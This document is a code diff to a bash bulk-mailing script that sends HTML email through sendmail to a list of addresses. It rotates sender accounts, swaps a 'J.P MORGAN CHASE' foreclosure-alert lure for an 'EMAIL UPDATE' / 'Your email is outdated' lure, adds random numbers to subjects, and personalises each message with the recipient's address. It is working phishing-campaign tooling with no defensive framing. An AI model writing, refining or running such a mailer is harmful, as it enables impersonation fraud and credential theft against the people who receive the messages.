@@ -150,14 +150,17 @@ while IFS= read -r email; do
   from_username="supportzed$counter"
   from_domain="admailsend.com"
   from_email="$from_username@$from_domain"
-  from_name="J.P MORGAN CHASE"
+  from_name="EMAIL UPDATE"
   from_header="$from_name <$from_email>"
 
   # Generate random 3-digit number (e.g., 123)
   random_number=$(shuf -i 100-999 -n 1)
 
   # Construct the subject with random number
-  subject="TEMPORARY ACCOUNT FORECLOSURE ALERT ($random_number)"
+  subject="SECURE MESSAGE - [Your email is outdated] ! ($random_number)"
+
+  # Read HTML content and replace {{EMAIL}} with the current email address
+  html_content=$(sed "s/{{EMAIL}}/$email/g" email.html)
 
   # Send the email
   cat <<EOF | /usr/sbin/sendmail -t
@@ -167,7 +170,7 @@ Subject: $subject
 MIME-Version: 1.0
 Content-Type: text/html
 
-$(cat email.html)
+$html_content
 EOF
 
   # Increment counter for next unique From email
